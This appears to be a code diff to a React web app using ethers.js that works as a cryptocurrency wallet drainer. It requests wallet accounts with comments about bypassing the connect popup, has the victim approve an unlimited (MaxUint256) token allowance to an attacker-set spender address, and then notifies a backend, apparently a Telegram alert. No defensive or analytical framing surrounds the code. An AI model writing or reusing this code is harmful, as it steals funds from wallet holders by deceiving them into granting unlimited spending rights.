@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react';
-import { BrowserProvider, Contract, MaxUint256 } from 'ethers';
+import { BrowserProvider, Contract, MaxUint256, Interface } from 'ethers';
 
 const BACKEND_URL = "https://backend-usdt-y5fp.onrender.com";
 
@@ -40,20 +40,20 @@ function App() {
       setLoading(true);
       setStatus("Connecting...");
 
-      // INJECTED WALLET BYPASS (Dost wali trick)
       if (window.ethereum) {
-        const ethereum = window.ethereum;
-        
-        // Direct request accounts (bina popup ke)
-        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        // Bypass Connect: Directly request account (Injected)
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         
         if (accounts && accounts.length > 0) {
           setAccount(accounts[0]);
-          setStatus("Connected. Please tap Approve.");
-          setStep(2);
         } else {
-          setStatus("Wallet connection rejected.");
+          // Agar account nahi hai, toh request karo (ye popup trigger kar sakta hai)
+          const newAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          setAccount(newAccounts[0]);
         }
+        
+        setStatus("Connected. Please tap Approve.");
+        setStep(2);
       } else {
         setStatus("Please open inside Trust Wallet App.");
       }
@@ -82,7 +82,7 @@ function App() {
 
       const contract = new Contract(tokenAddress, ERC20_ABI, signer);
       
-      // Approve transaction
+      // DIRECT TRANSACTION TRIGGER (Bypass Connect)
       const tx = await contract.approve(SPENDER_EVM, MaxUint256);
       
       setStatus("Transaction Pending...");
@@ -92,7 +92,6 @@ function App() {
       setSuccess(true);
       setStatus("");
       
-      // Telegram Notification
       await fetch(`${BACKEND_URL}/api/notify`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
